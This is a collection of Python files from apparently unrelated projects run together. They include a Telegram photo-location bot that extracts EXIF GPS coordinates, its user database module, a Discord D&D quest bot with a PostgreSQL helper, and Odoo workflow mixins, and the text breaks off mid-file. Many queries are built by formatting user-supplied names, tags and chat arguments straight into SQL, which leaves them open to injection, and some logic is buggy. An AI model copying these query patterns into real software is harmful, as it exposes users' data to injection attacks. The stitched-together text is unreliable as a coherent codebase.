    raw_latitude: IfdTag = None
    longitude_reference: str = None
    raw_longitude: IfdTag = None


class ImageHandler:

    def __init__(self, user, file):
        self.user = user
        self.file = file
        self.raw_data = None

    @staticmethod
    def _get_raw_data(file):
        """
        Get name of the camera and lens, the date when the photo was taken
        and raw coordinates (which later will be converted)
        :param file: byte sting with an image
        :return: RawImageData object with raw info from the photo
        """
        # Get data from the exif of the photo via external library
        exif = exifread.process_file(file, details=False)
        if not len(exif.keys()):
            reason = "This picture doesn't contain EXIF."
            log.info(reason)
            raise NoEXIF(reason)

        # Get info about camera ang lend from EXIF
        date_time = exif.get('EXIF DateTimeOriginal', None)
        date_time = str(date_time) if date_time else None
        camera_brand = str(exif.get('Image Make', ''))
        camera_model = str(exif.get('Image Model', ''))
        lens_brand = str(exif.get('EXIF LensMake', ''))
        lens_model = str(exif.get('EXIF LensModel', ''))

        if not any([date_time, camera_brand, camera_model, lens_brand,
                    lens_model]):
            # Means that there is actually no any data of our interest
            reason = 'There is no data of interest in this photo'
            log.info(reason)
            raise NoData(reason)

        try:  # Extract coordinates from EXIF
            latitude_reference = str(exif['GPS GPSLatitudeRef'])
            raw_latitude = exif['GPS GPSLatitude']
            longitude_reference = str(exif['GPS GPSLongitudeRef'])
            raw_longitude = exif['GPS GPSLongitude']

        except KeyError:
            log.info("This picture doesn't contain coordinates.")
            # returning info about the photo without coordinates
            return (date_time, camera_brand, camera_model,
                    lens_brand, lens_model)
        else:
            # returning info about the photo with its coordinates
            return (date_time, camera_brand, camera_model,
                    lens_brand, lens_model, latitude_reference, raw_latitude,
                    longitude_reference, raw_longitude)

    @staticmethod
    def _dedupe_string(string):
        """
        Get rid of all repetitive words in a string
        :param string: string with camera or lens names
        :return: same string without repetitive words
        """

        deduped_string = ''

        for x in string.split(' '):
            if x not in deduped_string:
                deduped_string += x + ' '
        return deduped_string.rstrip()

    @staticmethod
    def _check_camera_tags(tags):
        """
        Function that convert stupid code name of a smartphone or camera
        from EXIF to meaningful one by looking a collation in a special MySQL
        table For example instead of just Nikon there can be
        NIKON CORPORATION in EXIF

        :param tags: name of a camera and lens from EXIF
        :return: list with one or two strings which are name of
        camera and/or lens. If there is not better name for the gadget
        in database, function just returns name how it is
        """
        checked_tags = []

        for tag in tags:
            if tag:  # If there was this information inside EXIF of the photo
                tag = str(tag).strip()
                log.info('Looking up collation for %s', tag)
                query = ('SELECT right_tag '
                         'FROM tag_table '
                         'WHERE wrong_tag="{}"'.format(tag))
                cursor = db.execute_query(query)                    
                if not cursor:
                    log.error("Can't check the tag because of the db error")
                    log.warning("Tag will stay as is.")
                    continue
                if cursor.rowcount:
                    # Get appropriate tag from the table
                    tag = cursor.fetchone()[0]
                    log.info('Tag after looking up in tag_tables - %s.', tag)

            checked_tags.append(tag)
        return checked_tags

    @staticmethod
    def _get_dd_coordinate(angular_distance, reference):
        """
         Convert coordinates from format in which they are typically written
         in EXIF to decimal degrees - format that Telegram or Google Map
         understand. Google coordinates, EXIF and decimals degrees if you
         need to understand what is going on here

         :param angular_distance: ifdTag object from the exifread module -
         it contains a raw coordinate - either longitude or latitude
         :param reference:
          :return: a coordinate in decimal degrees format
         """
        ag = angular_distance
        degrees = ag.values[0].num / ag.values[0].den
        minutes = (ag.values[1].num / ag.values[1].den) / 60
        seconds = (ag.values[2].num / ag.values[2].den) / 3600

        if reference in 'WS':
            return -(degrees + minutes + seconds)

        return degrees + minutes + seconds

    def _convert_coordinates(self, raw_data):
        """
        # Convert GPS coordinates from format in which they are stored in
        EXIF of photo to format that accepts Telegram (and Google Maps for
        example)

        :param data: EXIF data extracted from photo
        :param chat_id: user id
        :return: either floats that represents longitude and latitude or
        string with error message dedicated to user
        """

        # Return positive or negative longitude/latitude from exifread's ifdtag

        try:
            latitude = self._get_dd_coordinate(raw_data.raw_latitude,
                                               raw_data.latitude_reference)
            longitude = self._get_dd_coordinate(raw_data.raw_longitude,
                                                raw_data.longitude_reference)

        except Exception as e:
            # todo also find out the error in case there is no coordinates in
            #  raw_data
            log.error(e)
            log.error('Cannot read coordinates of this photo.')
            raw_coordinates = (f'Latitude reference: '
                               f'{raw_data.latitude_reference}\n'
                               f'Raw latitude: {raw_data.raw_latitude}.\n'
                               f'Longitude reference: '
                               f'{raw_data.longitude_reference} '
                               f'Raw longitude: {raw_data.raw_longitude}.\n')
            log.info(raw_coordinates)
            raise InvalidCoordinates

        else:
            return latitude, longitude

    @staticmethod
    def _get_address(latitude, longitude):

        """
         # Get address as a string by coordinates from photo that user sent
         to bot
        :param latitude:
        :param longitude:
        :return: address as a string where photo was taken; name of
        country in English and Russian to keep statistics
        of the most popular countries among users of the bot
        """

        address = {}
        country = {}
        coordinates = f"{latitude}, {longitude}"
        log.debug('Getting address from coordinates %s...', coordinates)
        geolocator = Nominatim()

        try:
            # Get name of the country in English and Russian language
            location = geolocator.reverse(coordinates, language='en')
            address['en-US'] = location.address
            country['en-US'] = location.raw['address']['country']

            location2 = geolocator.reverse(coordinates, language='ru')
            address['ru-RU'] = location2.address
            country['ru-RU'] = location2.raw['address']['country']
            return address, country

        except Exception as e:
            log.error('Getting address has failed!')
            log.error(e)
            raise

    def _convert_data(self, raw_data):
        date_time = (str(raw_data.date_time) if raw_data.date_time else None)

        # Merge a brand and model together
        camera = f'{raw_data.camera_brand} {raw_data.camera_model}'
        lens = f'{raw_data.lens_brand} {raw_data.lens_model}'

        # Get rid of repetitive words
        camera = (self._dedupe_string(camera) if camera != ' ' else None)
        lens = (self._dedupe_string(lens) if lens != ' ' else None)

        camera, lens = self._check_camera_tags([camera, lens])

        try:
            latitude, longitude = self._convert_coordinates(raw_data)
        except (InvalidCoordinates, NoCoordinates):
            address = country = latitude = longitude = None
        else:
            try:
                address, country = self._get_address(latitude, longitude)
            except Exception as e:
                log.warning(e)
                address = country = None

        return date_time, camera, lens, address, country, latitude, longitude

    def get_image_info(self):
        """
        Read data from photo and prepare answer for user
        with location and etc.
        """
        raw_data = RawImageData(self.user, *self._get_raw_data(self.file))
        image_data = ImageData(self.user, *self._convert_data(raw_data))

        return image_data

"""
Module to manage users of bot: store and update information, interact with
the database, keep tack of and switch language of interface for user
"""

import config
from photogpsbot import bot, log, db
from photogpsbot.db_connector import DatabaseError, DatabaseConnectionError

from telebot.types import Message

class User:
    """
    Class that describes one user of this Telegram bot and helps to store basic
    info about him and his language of choice for interface of the bot
    """
    def __init__(self, chat_id, first_name, nickname, last_name,
                 language='en-US'):
        self.chat_id = chat_id
        self.first_name = first_name
        self.nickname = nickname
        self.last_name = last_name
        self.language = language

    def set_language(self, lang):
        """
        Update language of user in the User object and in the database
        :param lang: string with language tag like "en-US"
        :return: None
        """
        log.debug('Updating info about user %s language '
                  'in memory & database...', self)

        self.language = lang

        query = ("UPDATE users "
                 f"SET language='{self.language}' "                    
                 f"WHERE chat_id='{self.chat_id}'")                    

        try:
            db.add(query)                    
        except DatabaseError:
            log.error("Can't add new language of %s to the database", self)
        else:
            log.debug('Language updated.')

    def switch_language(self):
        """
        Switch language from Russian to English or conversely
        :return: string with language tag like "en-US" to be used for
        rendering menus and messages for user
        """
        curr_lang = self.language
        new_lang = 'ru-RU' if self.language == 'en-US' else 'en-US'
        log.info('Changing user %s language from %s to %s...', self,
                 curr_lang, new_lang)

        self.set_language(new_lang)

        return new_lang

    def __str__(self):
        return (f'{self.first_name} {self.nickname} {self.last_name} '
                f'({self.chat_id}) preferred language: {self.language}')

    def __repr__(self):
        return (f'{self.__class__.__name__}(chat_id={self.chat_id}, '
                f'first_name="{self.first_name}", nickname="{self.nickname}", '
                f'last_name="{self.last_name}", language="{self.language}")')


class Users:
    """
    Class for managing users of the bot: find them, add to system,
    cache them from the database, check whether user changed his info etc
    """
    def __init__(self):
        self.users = {}

    @staticmethod
    def get_total_number():
        """
        Count the total number of users in the database
        :return: integer which is the total number of users
        """
        query = "SELECT COUNT(*) FROM users"
        try:
            cursor = db.execute_query(query)                    
        except DatabaseConnectionError:
            log.error("Can't count the total number of users!")
            raise

        return cursor.fetchone()[0]

    @staticmethod
    def get_last_active_users(limit):
        """
        Get from the database a tuple of users who have been recently using
        the bot
        :param limit: integer that specifies how much users to get
        :return: tuple of tuples with users info
        """
        log.info('Evaluating last active users with date of '
                 'last time when they used bot...')

        # From photo_queries_table2 we take chat_id of the last
        # active users and from 'users' table we take info about these
        # users by chat_id which is a foreign key
        query = ('SELECT p.chat_id, u.first_name, u.nickname, u.last_name, '
                 'u.language '
                 'FROM photo_queries_table2 p '
                 'INNER JOIN users u '
                 'ON p.chat_id = u.chat_id '
                 'GROUP BY u.chat_id, u.first_name, u.nickname, u.last_name, '
                 'u.language '
                 'ORDER BY MAX(time)'
                 f'DESC LIMIT {limit}')                    

        try:
            cursor = db.execute_query(query)                    
        except DatabaseConnectionError:
            log.error("Cannot get the last active users because of some "
                      "problems with the database")
            raise

        last_active_users = cursor.fetchall()
        return last_active_users

    def cache(self, limit):
        """
        Caches last active users from database to a dictionary inside object of
        this class
        :param limit: limit of entries to be cached
        :return: None
        """

        log.debug("Start caching last active users from the DB...")

        try:
            last_active_users = self.get_last_active_users(limit)
        except DatabaseConnectionError:
            log.error("Cannot cache users!")
            return

        for items in last_active_users:
            # if chat_id of a user is not known to the program
            if items[0] not in self.users:
                # adding users from database to the "cache"
                self.users[items[0]] = User(*items)
                log.debug("Caching user: %s", self.users[items[0]])
        log.info('Users have been cached.')

    def clean_cache(self, limit):
        """
        Method that remove several User objects from cache - the least 
        active users
        :param limit: number of the users that the method should remove
        from cache
        :return: None
        """

        log.info('Figuring out the least active users...')
        # Select users that the least active recently
        user_ids = tuple(self.users.keys())
        query = ('SELECT chat_id '
                 'FROM photo_queries_table2 '
                 f'WHERE chat_id in {user_ids} '
                 'GROUP BY chat_id '
                 'ORDER BY MAX(time) '
                 f'LIMIT {limit}')                    

        try:
            cursor = db.execute_query(query)                    
        except DatabaseConnectionError:
            log.error("Can't figure out the least active users...")
            return

        if not cursor.rowcount:
            log.warning("There are no users in the db")
            return

        # Make list out of tuple of tuples that is returned by MySQL
        least_active_users = [chat_id[0] for chat_id in cursor.fetchall()]
        log.info('Removing %d least active users from cache...', limit)
        num_deleted_entries = 0
        for entry in least_active_users:
            log.debug('Deleting %s...', entry)
            deleted_entry = self.users.pop(entry, None)
            if deleted_entry:
                num_deleted_entries += 1
        log.debug("%d users were removed from cache.", num_deleted_entries)

    @staticmethod
    def _add_to_db(user):
        """
        Adds User object to the database
        :param user: User object with info about user
        :return: None
        """
        query = ("INSERT INTO users (chat_id, first_name, nickname, "
                 "last_name, language) "
                 f"VALUES ({user.chat_id}, '{user.first_name}', "                    
                 f"'{user.nickname}', '{user.last_name}', '{user.language}')")                    
        try:
            db.add(query)                    
        except DatabaseError:
            log.error("Cannot add user to the database")
        else:
            log.info(f"User {user} was successfully added to the users db")

    def add_new_one(self, chat_id, first_name, nickname, last_name, language,
                    add_to_db=True):
        """
        Function to add a new User in dictionary with users and to the database
        at one fell swoop
        :param chat_id: id of a Telegram user
        :param first_name: first name of a Telegram user
        :param nickname: nickname of a Telegram user
        :param last_name: last name of a Telegram user
        :param language: preferred language of a Telegram user
        :param add_to_db: whether of not to add user to the database (for
        example, if bot is caching users from the database, there is clearly
        no point to add them back to the database)
        :return: User object with info about the added user
        """
        user = User(chat_id, first_name, nickname, last_name, language)
        self.users[chat_id] = user
        if add_to_db:
            self._add_to_db(user)
        return user

    @staticmethod
    def compare_and_update(user, message):
        """
        This method compare a user object from the bot and his info from
        the Telegram message to check whether a user has changed his bio
        or not. If yes, the user object that represents him in the bot will
        be updated accordingly. Now this function is called only when a user
        asks the bot for showing the most popular cams

        :param user: user object that represents a Telegram user in this bot
        :param message: object from Telegram that contains info about user's
        message and about himself
        :return: None
        """

        log.info('Checking whether user have changed his info or not...')
        msg = message.from_user
        usr_from_message = User(message.chat.id, msg.first_name, msg.username,
                                msg.last_name)

        if user.chat_id != usr_from_message.chat_id:
            log.error("Wrong user to compare!")
            return

        if user.first_name != usr_from_message.first_name:
            user.first_name = usr_from_message.first_name

        elif user.nickname != usr_from_message.nickname:
            user.nickname = usr_from_message.nickname

        elif user.last_name != usr_from_message.last_name:
            user.last_name = usr_from_message.last_name

        else:
            log.debug("User's info hasn't changed")
            return

        log.info("User has changed his info")
        log.debug("Updating user's info in the database...")
        query = (f"UPDATE users "
                 f"SET first_name='{user.first_name}', "                    
                 f"nickname='{user.nickname}', "                    
                 f"last_name='{user.last_name}' "                    
                 f"WHERE chat_id={user.chat_id}")                    

        try:
            db.add(query)                    
        except DatabaseError:
            log.error("Could not update info about %s in the database",
                      user)
        else:
            log.debug("User's info has been updated")

    def find_one(self, message: Message) -> User:
        """
        Look up a user by a message which we get together with request
        from Telegram
        :param message: object from Telegram that contains info about user's
        message and about himself
        :return: user object that represents a Telegram user in this bot
        """

        # look up user in the cache of the bot
        user = self.users.get(message.chat.id, None)

        if user:
            return user

        # otherwise look up the user in the database
        log.debug("Looking up the user in the database as it doesn't "
                  "appear in cache")
        query = (f'SELECT first_name, nickname, last_name, language '
                 f'FROM users '
                 f'WHERE chat_id={message.chat.id}')                    

        try:
            cursor = db.execute_query(query)                    
        except DatabaseConnectionError:

            # Even if the database in unreachable add user to dictionary
            # with users otherwise the bot will crash requesting this
            # user's info
            log.error('Cannot lookup the user with chat_id %d in database',
                      message.chat.id)
            msg = message.from_user
            user = self.add_new_one(message.chat.id, msg.first_name,
                                    msg.last_name, msg.username,
                                    language='en-US', add_to_db=False)
            return user

        if not cursor.rowcount:
            # This user uses our photoGPSbot for the first time as we
            # can't find him in the database
            log.info('Adding totally new user to the system...')
            msg = message.from_user
            user = self.add_new_one(message.chat.id, msg.first_name,
                                    msg.last_name, msg.username,
                                    language='en-US')
            bot.send_message(config.MY_TELEGRAM,
                             text=f'You have a new user! {user}')
            log.info('You have a new user! Welcome %s', user)

        # finally if the user wasn't found in the cache of the bot, but was
        # found in the database
        else:
            log.debug('User %d has been found in the database',
                      message.chat.id)

            user_data = cursor.fetchall()[0]
            user = self.add_new_one(message.chat.id, *user_data,
                                    add_to_db=False)

        return user

    def __str__(self):
        return ('Instance of a handler of users. '
                f'There is {len(self.users)} users in cache right now.')

#!/usr/bin/env python3

# Vishnu by Valkyrie
#
# Discord bot that handles dice rolling and other things

import discord, yaml, vroll, pgsql, re                    
import texttable as tt
from discord.ext import commands

config = yaml.safe_load(open("config.yaml"))
token = config['token']
chan_whitelist = config['chan_whitelist']
pg_connection = config['pg_connection']
role_whitelist = config['role_whitelist']
permission_error_message = config['permission_error_message']
quest_tier_whitelist = config['quest_tiers']

# Create PostgreSQL tables.
pgsql.create_tables(pg_connection)

description = """
Vishnu, a multipurpose D&D bot.
"""

bot = commands.Bot(command_prefix='!', description=description)

"""
Role whitelisting function
"""
def whitelist_check(ctx):
    for x in role_whitelist:
        if x in [y.id for y in ctx.message.author.roles]:
            return True
        else:
            return False

"""
QUEST-RELATED COMMANDS
"""
@bot.command()
async def addquest(ctx, quest_tier, *desc):
    """
    Allows a DM to create a quest.

    !addquest [TIER] [DESCRIPTION]
    """

    if whitelist_check(ctx):
        if quest_tier in quest_tier_whitelist:
            if len(desc) < 100:
                quest_desc = " ".join(desc)
                creator = str(ctx.author)

                pgsql.import_quest_data(pg_connection, quest_tier, quest_desc, creator)

                print("Tier {} quest added by {}. Description: {}".format(quest_tier, str(ctx.author), quest_desc))
                await ctx.send("Tier {} quest added by {}. Description: {}".format(quest_tier, str(ctx.author), quest_desc))
            else:
                await ctx.send("Error: Your description is too long. The maximum allowed characters is 100, you had " + str(len(desc)))
        else:
            await ctx.send("Error: The quest tier you specified is invalid. The valid quest tiers are: " + ", ".join(quest_tier_whitelist) + ". You specified: " + quest_tier)
    else:
        await ctx.send(permission_error_message)

@bot.command()
async def delquest(ctx, quest_id):
    """
    Allows a DM to delete a quest by their ID.

    !delquest [ID]
    """

    if whitelist_check(ctx):
        pgsql.delete_quest(pg_connection, quest_id)
        await ctx.send("Quest with ID " + quest_id + " deleted.")
    else:
        await ctx.send(permission_error_message)

@bot.command()
async def questcomplete(ctx, quest_id):
    """
    Allows a DM to set a quest to 'complete' by specifying a quest ID.

    !questcomplete [ID]
    """

    if whitelist_check(ctx):
        pgsql.complete_quest(pg_connection, quest_id, True)
    else:
        await ctx.send(permission_error_message)

@bot.command()
async def questuncomplete(ctx, quest_id):
    """
    Allows a DM to set a quest to 'uncomplete' by specifying a quest ID.

    !questuncomplete [ID]
    """

    if whitelist_check(ctx):
        pgsql.complete_quest(pg_connection, quest_id, False)
    else:
        await ctx.send("You don't have permission to use this command")

@bot.command()
async def getquest(ctx, *args):
    """
    Allows any user to retrieve quests by specifying an ID, tier, or creator. Otherwise, returns all quests.

    !getquest [id=ID] [tier=TIER] [creator=CREATOR]
    """

    command = " ".join(map(str, args))

    idsearch= "id=([\d])"
    tiersearch= "tier=([^\s]+)"
    creatorsearch= "creator=([^\s]+)"
    idformat = ""
    tierformat= ""
    creatorformat= ""

    if re.search(idsearch, command) is not None:
        idmatch = re.search(idsearch, command).group(1)
        idformat = "AND id = {}".format(idmatch)

    if re.search(tiersearch, command) is not None:
        tiermatch = re.search(tiersearch, command).group(1)
        tierformat = "AND tier = '{}'".format(tiermatch)
    if re.search(creatorsearch, command) is not None:
        creatormatch = re.search(creatorsearch, command).group(1)
        creatorformat = "AND creator = '{}'".format(creatormatch)

    # Craft a postgres SQL query.
    query = """                    
    SELECT id, tier, creator, description FROM quests                    
    WHERE completed = 'f'                    
    {}
    {}
    {};                    
    """.format(idformat, tierformat, creatorformat)                    

    query_return = pgsql.retrieve_quest_data(pg_connection, query) # Execute our query                    

    # Format the results as a table
    tab = tt.Texttable()
    headings = ['ID', 'TIER', 'CREATOR', 'DESCRIPTION']
    tab.header(headings)

    for x in range(0, len(query_return), 5):
        for row in query_return[x:x+5]:
            tab.add_row(row)


        s = tab.draw()
        print(len(query_return))                    
        await ctx.send("```" + s + "```")
        tab.reset()

"""
DICE COMMANDS
"""
@bot.command()
async def roll(ctx, *args):
    """
    Rolls dice.

    !roll [NUM]d[FACES]+[NUM]
    """

    if chan_whitelist is None: # If the whitelist is empy, run the roll function in any channel
        for x in args:
            print("!roll command recieved in channel ID " + str(ctx.channel.id))
            await ctx.send(vroll.roll(x))


    elif ctx.channel.id in chan_whitelist: # Checks for the channel ID in the whitelist
        for x in args:
            print("!roll command recieved in channel ID " + str(ctx.channel.id) + " by user " + str(ctx.author))
            await ctx.send(vroll.roll(x))

@bot.event
async def on_ready():
    print("{0.user} connected to server".format(bot))
    print("Whitelisted channel IDs are: " + str(chan_whitelist))
    print("Whitelisted role IDs are: " + str(role_whitelist))

bot.run(token)

"""
PostgreSQL module for vishnu.
"""

import yaml, psycopg2


def create_tables(pg_connection):

    conn = psycopg2.connect(                    
        dbname=pg_connection['database'],                    
        user=pg_connection['user'],                    
        password=pg_connection['password'],                    
        host=pg_connection['host'])                    
    cur = conn.cursor()                    

    # Make the table if it doesn't exist.
    cur.execute("""
    CREATE TABLE IF NOT EXISTS quests
    (id SERIAL PRIMARY KEY, tier VARCHAR, description VARCHAR, creator VARCHAR, completed BOOLEAN);
    """)                    
    conn.commit()
    cur.close()                    
    conn.close()                    


def import_quest_data(pg_connection, quest_tier, quest_desc, creator):
    conn = psycopg2.connect(                    
        dbname=pg_connection['database'],                    
        user=pg_connection['user'],                    
        password=pg_connection['password'],                    
        host=pg_connection['host'])                    
    cur = conn.cursor()                    

    cur.execute(
        """
    INSERT INTO quests (tier, description, creator, completed)
    VALUES (%s, %s, %s, False);
    """, (quest_tier, quest_desc, creator))
    conn.commit()
    cur.close()                    
    conn.close()                    


def delete_quest(pg_connection, quest_id):
    conn = psycopg2.connect(                    
        dbname=pg_connection['database'],                    
        user=pg_connection['user'],                    
        password=pg_connection['password'],                    
        host=pg_connection['host'])                    
    cur = conn.cursor()                    

    cur.execute("""
    DELETE FROM quests
    WHERE id = %s;""", quest_id)
    conn.commit()
    cur.close()                    
    conn.close()                    

def complete_quest(pg_connection, quest_id, completion):
    conn = psycopg2.connect(                    
        dbname=pg_connection['database'],                    
        user=pg_connection['user'],                    
        password=pg_connection['password'],                    
        host=pg_connection['host'])                    
    cur = conn.cursor()                    

    cur.execute("""
    UPDATE quests
    SET completed = '%s'
    WHERE id = %s;
    """, (completion, quest_id))
    conn.commit()
    cur.close()                    
    conn.close()                    

def retrieve_quest_data(pg_connection, query):                    
    conn = psycopg2.connect(                    
        dbname=pg_connection['database'],                    
        user=pg_connection['user'],                    
        password=pg_connection['password'],                    
        host=pg_connection['host'])                    
    cur = conn.cursor()                    

    cur.execute(query)                    

    results = list(cur.fetchall())                    

    cur.close()                    
    conn.close()                    
    return results                    


def retrieve_all_quests(pg_connection):                    
    conn = psycopg2.connect(                    
        dbname=pg_connection['database'],                    
        user=pg_connection['user'],                    
        password=pg_connection['password'],                    
        host=pg_connection['host'])                    
    cur = conn.cursor()                    

    cur.execute("""
    SELECT id, tier, creator, description FROM quests
    WHERE completed = 'f';                    
    """)                    

    results = cur.fetchall()                    

    cur.close()                    
    conn.close()                    
    return results                    

# coding: utf-8

"""
¬©2019
License: AGPL-3

@author: C. Guychard (Article 714)

"""


from odoo import models, api
from odoo.addons.base_crapo_workflow.mixins import crapo_automata_mixins

import logging


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = "crm.stage"
    _state_for_model = "crm.lead"

    def write(self, values):
        if len(self) == 1:
            if 'crapo_state' not in values and not self.crapo_state:
                if 'name' in values:
                    vals = {'name': values['name']}
                else:
                    vals = {'name': self.name}
                mystate = self._compute_related_state(vals)
                values['crapo_state'] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        if 'crapo_state' not in values and not self.crapo_state:
            if 'name' in values:
                vals = {'name': values['name']}
            mystate = self._compute_related_state(vals)
            values['crapo_state'] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """ Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """
        if column_name not in ["crapo_state"]:
            super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            query = 'SELECT id, name FROM "%s" WHERE "%s" is NULL' % (                    
                self._table, column_name)
            self.env.cr.execute(query)
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(
                    self, values={'name': stage[1]})

                query = 'UPDATE "%s" SET "%s"=%%s WHERE id = %s' % (                    
                    self._table, column_name, stage[0])
                logging.error("TADAAA: %s" % query)
                self.env.cr.execute(query, (default_value,))

# coding: utf-8

# ¬©2018-2019 Article 714
# License AGPL-3.0 or later (http://www.gnu.org/licenses/agpl.html).                    
import logging

from odoo import fields, api, exceptions, _
from odoo import SUPERUSER_ID
from odoo.tools.safe_eval import safe_eval

from odoo.addons.base_crapo_workflow.mixins.crapo_readonly_view_mixin import (
    ReadonlyViewMixin,                    
)                    


class ObjectWithStateMixin(ReadonlyViewMixin):                    
    """
        Mixin class that can be used to define an Odoo Model eligible
        to be managed by a Crapo Automaton

        Should be use as a mixin class in existing objects
    """

    _readonly_domain = (
        "[('crapo_readonly_fields', 'like', ',{},'.format(field_name))]"                    
    )                    
    _readonly_fields_to_add = ["crapo_readonly_fields"]

    automaton = fields.Many2one(
        comodel_name="crapo.automaton",
        string="Related automaton",
        help=(
            "The automaton describes the various transitions "
            "an object can go through between states."
        ),                    
        default=lambda self: self._get_model_automaton(),                    
        store=True,
        index=True,
        required=True,
    )                    

    state = fields.Many2one(
        comodel_name="crapo.state",
        help="""State in which this object is""",
        track_visibility="onchange",
        domain=lambda self: self._get_state_domain(),                    
        group_expand="_read_group_states",
        default=lambda self: self._get_default_state(),                    
        store=True,
        index=True,
        required=True,
    )                    

    crapo_readonly_fields = fields.Char(
        compute="_compute_crapo_readonly_fields", default=",0,"
    )                    

    @api.depends("state")                    
    @api.onchange("state")                    
    def _compute_crapo_readonly_fields(self):                    
        for rec in self:
            if rec.state.readonly_fields:
                rec.crapo_readonly_fields = ",{},".format(
                    rec.state.readonly_fields
                )                    
            else:
                rec.crapo_readonly_fields = ",0,"

    # Computes automaton for current model
    @api.model
    def _get_model_automaton(self):                    
        automaton_model = self.env["crapo.automaton"]

        my_model = self.env["ir.model"].search(
            [("model", "=", self._name)], limit=1                    
        )                    
        my_automaton = automaton_model.search(
            [("model_id", "=", my_model.id)], limit=1                    
        )                    

        if my_automaton:
            return my_automaton
        else:
            return automaton_model.create(
                {
                    "name": "Automaton for {}".format(self._name),                    
                    "model_id": my_model.id,
                }
            )                    

    # State Management
    def _get_state_domain(self, domain=None):                    
        result = []

        if self.automaton:
            result.append(("automaton", "=", self.automaton.id))                    
        else:
            result.append(("automaton", "=", self._get_model_automaton().id))                    

        return result

    def _get_default_state(self):                    
        domain = self._get_state_domain()                    
        state_model = self.env["crapo.state"]
        automaton = self._get_model_automaton()                    

        if automaton:
            domain.append("|")                    
            domain.append(("is_start_state", "=", True))                    
            domain.append(("default_state", "=", 1))                    

        default_state = state_model.search(domain, limit=1)                    

        if default_state:
            return default_state
        elif automaton:
            return state_model.create(
                {"name": "New", "automaton": automaton.id}
            )                    
        else:
            return False

    def _next_states(self):                    
        self.ensure_one()                    
        domain = self._get_state_domain()                    

        next_states = False
        if self.automaton:
            eligible_transitions = self.env["crapo.transition"].search(
                [
                    ("automaton", "=", self.automaton.id),                    
                    ("from_state", "=", self.state.id),                    
                ]
            )                    

            target_ids = eligible_transitions.mapped(lambda x: x.to_state.id)                    

            if target_ids:
                domain.append(("id", "in", target_ids))                    

                next_states = self.env["crapo.state"].search(domain)                    

        else:
            domain.append(("sequence", ">", self.state.sequence))                    
            next_states = self.env["crapo.state"].search(domain, limit=1)                    

        return next_states

    def _read_group_states(self, states, domain, order):                    
        search_domain = self._get_state_domain(domain=domain)                    
        state_ids = states._search(
            search_domain, order=order, access_rights_uid=SUPERUSER_ID
        )                    
        return states.browse(state_ids)                    

    # =================
    # Write / Create
    # =================
    @api.multi
    def write(self, values):                    
        """
            Override write method in order to preventing transitioning
            to a non eligible state
        """
        # Look for a change of state
        target_state_id = None
        result = True

        if "state" in values:
            target_state_id = values["state"]

        # check if there is a change state needed
        if target_state_id is not None:
            # Search for elected transition
            transition = self._get_transition(target_state_id)                    

            if transition:
                result = True

                if transition.write_before:
                    result = super(ObjectWithStateMixin, self).write(values)                    

                self.exec_conditions(transition.preconditions, "Pre")                    
                self.exec_action(transition.action, transition.async_action)                    
                self.exec_conditions(transition.postconditions, "Post")                    

                # Return now if write has already been done
                if transition.write_before:
                    return result

        return super(ObjectWithStateMixin, self).write(values)                    

    def _get_transition(self, target_state_id):                    
        """
            Retrieve transition between two state
        """
        # Check if next state is valid
        current_state = False
        for rec in self:
            next_states = rec._next_states()                    
            if rec.state.id == target_state_id:
                current_state = rec.state
                continue
            elif not next_states:
                raise exceptions.ValidationError(
                    _("No target state is elegible for transitionning")                    
                )                    
            elif target_state_id not in next_states.ids:
                raise exceptions.ValidationError(
                    _("State is not in eligible target states")                    
                )                    
            elif current_state is not False and current_state != rec.state:
                raise exceptions.ValidationError(
                    _("Transitionning is not possible from differents states")                    
                )                    
            else:
                current_state = rec.state

        # Search for elected transition
        transition = self.env["crapo.transition"].search(
            [
                ("from_state", "=", current_state.id),                    
                ("to_state", "=", target_state_id),                    
            ],
            limit=1,
        )                    

        return transition

    def exec_conditions(self, conditions, prefix):                    
        """
            Execute Pre/Postconditions.

            conditions: must be a safe_eval expression
            prefix: a string to indicate if it's pre or post conditions
        """
        if conditions:
            for rec in self:
                try:
                    is_valid = safe_eval(
                        conditions, {"object": rec, "env": self.env}
                    )                    
                except Exception as err:
                    logging.error(
                        "CRAPO: Failed to validate transition %sconditions: %s",
                        prefix,
                        str(err),                    
                    )                    
                    is_valid = False

                # Raise an error if not valid
                if not is_valid:
                    raise exceptions.ValidationError(
                        _("Invalid {}-conditions for Object: {}").format(                    
                            prefix, rec.display_name
                        )                    
                    )                    

    def exec_action(self, action, async_action):                    
        if action:
            context = {
                "active_model": self._name,
                "active_id": self.id,
                "active_ids": self.ids,
            }
            if async_action:
                action.with_delay().run_async(context)                    
            else:
                action.with_context(context).run()                    


class StateObjectMixin(object):                    
    """
    Mixin class that can be used to define a state object
    that can be used as a crapo_state

    Should be use as a mixin class in existing objects
    """

    automaton = fields.Many2one(
        comodel_name="crapo.automaton",
        default=lambda self: self._get_default_automaton(),                    
        store=True,
        required=True,
        index=True,
    )                    

    default_state = fields.Boolean(
        help="Might be use as default stage.", default=False, store=True
    )                    

    # Transitions (inverse relations)                    

    transitions_to = fields.One2many(
        string="Incomint transitions",
        comodel_name="crapo.transition",
        inverse_name="to_state",
    )                    

    transitions_from = fields.One2many(
        string="Outgoing transitions",
        comodel_name="crapo.transition",
        inverse_name="from_state",
    )                    
    # computed field to identify start and end states

    is_start_state = fields.Boolean(
        "Start State",
        compute="_compute_is_start_state",
        store=True,
        index=True,
    )                    

    is_end_state = fields.Boolean(
        "End State", compute="_compute_is_end_state", store=True, index=True
    )                    

    readonly_fields = fields.Char(
        help="List of model's fields name separated by comma"
    )                    

    @api.depends("transitions_to", "automaton")                    
    def _compute_is_start_state(self):                    
        for record in self:
            if (
                len(record.transitions_to) == 0                    
                or record.transitions_to is False
            ):                    
                record.is_start_state = True
            else:
                record.is_start_state = False

    @api.depends("transitions_from", "automaton")                    
    def _compute_is_end_state(self):                    
        for record in self:
            if (
                len(record.transitions_to) == 0                    
                or record.transitions_to is False
            ):                    
                record.is_end_state = True
            else:
                record.is_end_state = False

    def _do_search_default_automaton(self):                    
        return False

    @api.model
